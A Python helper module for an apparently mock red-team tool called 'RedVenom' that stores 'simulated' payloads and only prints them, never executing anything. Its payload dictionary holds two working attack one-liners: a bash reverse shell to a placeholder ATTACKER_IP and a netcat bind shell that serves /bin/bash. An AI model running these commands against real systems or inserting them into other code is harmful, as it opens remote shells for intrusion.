#!/usr/bin/env python3

"""
RedVenom Payload Helper
-----------------------
Handles simulated payload selection, description, and delivery.
This is a helper module for use by the main launcher script.
"""

# Simulated payloads dictionary
payloads = {
    "reverse_shell": {
        "description": "Simulated reverse shell payload.",
        "code": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
    },
    "bind_shell": {
        "description": "Simulated bind shell payload.",
        "code": "nc -nlvp 4444 -e /bin/bash"
    },
    "custom_payload": {
        "description": "Launches a simulated custom payload.",
        "code": "echo 'Launching custom payload...'"
    }
}


def list_payloads():
    """Returns a list of available payload names."""
    return list(payloads.keys())


def get_payload_details(payload_name):
    """
    Retrieves the payload dictionary if it exists.

    Args:
        payload_name (str): The key for the payload.

    Returns:
        dict or None: Payload details or None if not found.
    """
    return payloads.get(payload_name, None)


def simulate_payload_launch(payload_name, target):
    """
    Simulates the launching of a payload.

    Args:
        payload_name (str): The selected payload.
        target (str): Target IP or hostname.
    """
    payload = get_payload_details(payload_name)
    if not payload:
        print(f"[-] Payload '{payload_name}' not found.")
        return

    print(f"[+] Target: {target}")
    print(f"[+] Payload: {payload_name}")
    print(f"[*] Description: {payload['description']}")
    print("[*] Preparing simulated payload...")
    print(f"[!] Executing (simulated): {payload['code']}")
    print("[✓] Payload delivered (simulated).")
